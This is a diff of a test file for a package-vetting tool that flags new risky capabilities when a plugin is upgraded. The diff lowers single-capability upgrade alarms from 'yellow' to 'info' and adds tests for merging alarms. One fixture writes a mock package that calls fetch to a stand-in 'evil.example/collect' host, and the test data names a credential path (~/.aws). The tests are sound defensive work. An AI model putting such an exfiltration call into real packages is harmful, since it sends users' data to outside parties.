@@ -115,10 +115,10 @@ describe('n6 version diff (upgrade behavioral diff)', () => {
       expect(recordCount()).toBe(1)
     })
 
-    it('冷启动 + exec+network 双高 → yellow upgrade-cold 提示（不完全静默）', () => {
+    it('冷启动 + exec+network 双高 → info upgrade-cold 提示（蓝色观察，不完全静默）', () => {
       const outcome = recordScan('@x/p', '1.0.0', manifest({ hasNetwork: true, hasExec: true }))
       expect(outcome.alarm?.kind).toBe('upgrade-cold')
-      expect(outcome.alarm?.severity).toBe('yellow')
+      expect(outcome.alarm?.severity).toBe('info')
       expect(outcome.alarm?.message).toContain('执行+网络')
     })
 
@@ -127,14 +127,14 @@ describe('n6 version diff (upgrade behavioral diff)', () => {
       expect(outcome.alarm).toBeNull()
     })
 
-    it('升级新增网络主机 → yellow upgrade-diff，from/to 正确', () => {
+    it('升级新增网络主机 → info upgrade-diff，from/to 正确', () => {
       recordScan('@x/p', '1.0.0', manifest({ hosts: ['old.com'] }))
       const outcome = recordScan('@x/p', '1.0.1', manifest({ hosts: ['old.com', 'evil-cdn.com'] }))
       expect(outcome.from).toBe('1.0.0')
       expect(outcome.to).toBe('1.0.1')
       expect(outcome.added?.hosts).toEqual(['evil-cdn.com'])
       expect(outcome.alarm?.kind).toBe('upgrade-diff')
-      expect(outcome.alarm?.severity).toBe('yellow')
+      expect(outcome.alarm?.severity).toBe('info')
       expect(outcome.alarm?.message).toContain('1.0.0 → 1.0.1')
       expect(outcome.alarm?.message).toContain('网络主机 evil-cdn.com')
       expect(recordCount()).toBe(2)
@@ -153,10 +153,10 @@ describe('n6 version diff (upgrade behavioral diff)', () => {
       expect(outcome.alarm?.severity).toBe('red')
     })
 
-    it('升级新增 非敏感路径 → yellow（任何新增能力都可见）', () => {
+    it('升级新增 非敏感路径 → info（蓝色观察；任何新增能力仍可见）', () => {
       recordScan('@x/p', '1.0.0', manifest())
       const outcome = recordScan('@x/p', '1.0.1', manifest({ fsPaths: ['./app/data'] }))
-      expect(outcome.alarm?.severity).toBe('yellow')
+      expect(outcome.alarm?.severity).toBe('info')
       expect(outcome.added?.fsPaths).toEqual(['./app/data'])
     })
 
@@ -243,12 +243,12 @@ describe('n6 version diff (upgrade behavioral diff)', () => {
       expect(back.added.fsPaths).toEqual([])
     })
 
-    it('upgradeSeverity：无新增 → null；单新增 → yellow；组合 → red', () => {
+    it('upgradeSeverity：无新增 → null；单新增 → info；组合 → red', () => {
       expect(upgradeSeverity({ hosts: [], fsPaths: [], spawnCmds: [], imports: [], hasNetwork: false, hasExec: false })).toBeNull()
-      expect(upgradeSeverity({ hosts: ['x'], fsPaths: [], spawnCmds: [], imports: [], hasNetwork: false, hasExec: false })).toBe('yellow')
+      expect(upgradeSeverity({ hosts: ['x'], fsPaths: [], spawnCmds: [], imports: [], hasNetwork: false, hasExec: false })).toBe('info')
       expect(upgradeSeverity({ hosts: [], fsPaths: [], spawnCmds: [], imports: [], hasNetwork: true, hasExec: true })).toBe('red')
       expect(upgradeSeverity({ hosts: [], fsPaths: ['~/.aws/x'], spawnCmds: [], imports: [], hasNetwork: true, hasExec: false })).toBe('red')
-      expect(upgradeSeverity({ hosts: [], fsPaths: ['./app/data'], spawnCmds: [], imports: [], hasNetwork: true, hasExec: false })).toBe('yellow')
+      expect(upgradeSeverity({ hosts: [], fsPaths: ['./app/data'], spawnCmds: [], imports: [], hasNetwork: true, hasExec: false })).toBe('info')
     })
 
     it('isSensitiveFsPath：凭据段命中，普通路径不误抬', () => {
@@ -285,12 +285,50 @@ describe('n6 version diff (upgrade behavioral diff)', () => {
     })
   })
 
+  describe('0.3.6 升级报警聚合（mergeKey scan:upgrade）', () => {
+    it('多条升级报警折叠为单行 count 累计；info 不抬盾牌、不计 alarmCount', () => {
+      const status = new VetStatus()
+      const now = Date.now()
+      status.record({
+        id: 'upgrade-diff:a:1:2', severity: 'info', source: 'scan', kind: 'upgrade-diff',
+        message: 'm-a', target: '@x/a', pluginHint: '@x/a', mergeKey: 'scan:upgrade', at: now,
+      })
+      status.record({
+        id: 'upgrade-diff:b:1:2', severity: 'info', source: 'scan', kind: 'upgrade-diff',
+        message: 'm-b', target: '@x/b', pluginHint: '@x/b', mergeKey: 'scan:upgrade', at: now,
+      })
+      const snap = status.snapshot()
+      expect(snap.alarms.length).toBe(1)
+      expect(snap.alarms[0].count).toBe(2)
+      expect(snap.alarmCount).toBe(0)
+      expect(snap.level).toBe('green')
+    })
+
+    it('聚合行内任一 red 组合 → 整行升级为 red（可行动信号不被 info 淹没）', () => {
+      const status = new VetStatus()
+      const now = Date.now()
+      status.record({
+        id: 'upgrade-diff:a:1:2', severity: 'info', source: 'scan', kind: 'upgrade-diff',
+        message: 'm-a', target: '@x/a', pluginHint: '@x/a', mergeKey: 'scan:upgrade', at: now,
+      })
+      status.record({
+        id: 'upgrade-diff:b:1:2', severity: 'red', source: 'scan', kind: 'upgrade-diff',
+        message: 'm-b', target: '@x/b', pluginHint: '@x/b', mergeKey: 'scan:upgrade', at: now,
+      })
+      const snap = status.snapshot()
+      expect(snap.alarms.length).toBe(1)
+      expect(snap.alarms[0].severity).toBe('red')
+      expect(snap.alarmCount).toBe(1)
+      expect(snap.level).toBe('red')
+    })
+  })
+
   describe('internal/plugin 接线（真实扫描链路）', () => {
     const fiber = (over: Record<string, unknown>) => ({
       uid: 1, state: 0, dispose: vi.fn(async () => {}), ...over,
     })
 
-    it('升级扫描自动记录差分并报警（yellow upgrade-diff）', async () => {
+    it('升级扫描自动记录差分并报警（info 蓝色聚合行，不抬盾牌）', async () => {
       const profile = mkdtempSync(join(tmpdir(), 'vet-n6-profile-'))
       const pkg = join(profile, 'node_modules', '@vet-test', 'n6pkg')
       mkdirSync(pkg, { recursive: true })
@@ -317,14 +355,16 @@ describe('n6 version diff (upgrade behavioral diff)', () => {
         expect(status.snapshot().alarmCount).toBe(0)
         expect(loadCapabilities().records['@vet-test/n6pkg@1.0.0']).toBeDefined()
 
-        // 升级到 2.0.0（新增网络主机 evil.example）：yellow upgrade-diff
+        // 升级到 2.0.0（新增网络主机 evil.example）：info upgrade-diff（蓝色观察）
         writePkg('2.0.0', 'fetch("https://evil.example/collect"); module.exports = 2')
         await h(fiber({ entry: { options: { name: '@vet-test/n6pkg' } } }))
         const snap = status.snapshot()
-        expect(snap.alarmCount).toBe(1)
+        // 0.3.6：升级观察为 info——不参与 alarmCount、不抬盾牌 level（蓝牌不是黄牌）
+        expect(snap.alarmCount).toBe(0)
+        expect(snap.level).toBe('green')
         const alarm = snap.alarms[0]
         expect(alarm.kind).toBe('upgrade-diff')
-        expect(alarm.severity).toBe('yellow')
+        expect(alarm.severity).toBe('info')
         expect(alarm.message).toContain('1.0.0 → 2.0.0')
         expect(alarm.message).toContain('evil.example')
         expect(loadCapabilities().records['@vet-test/n6pkg@2.0.0']).toBeDefined()
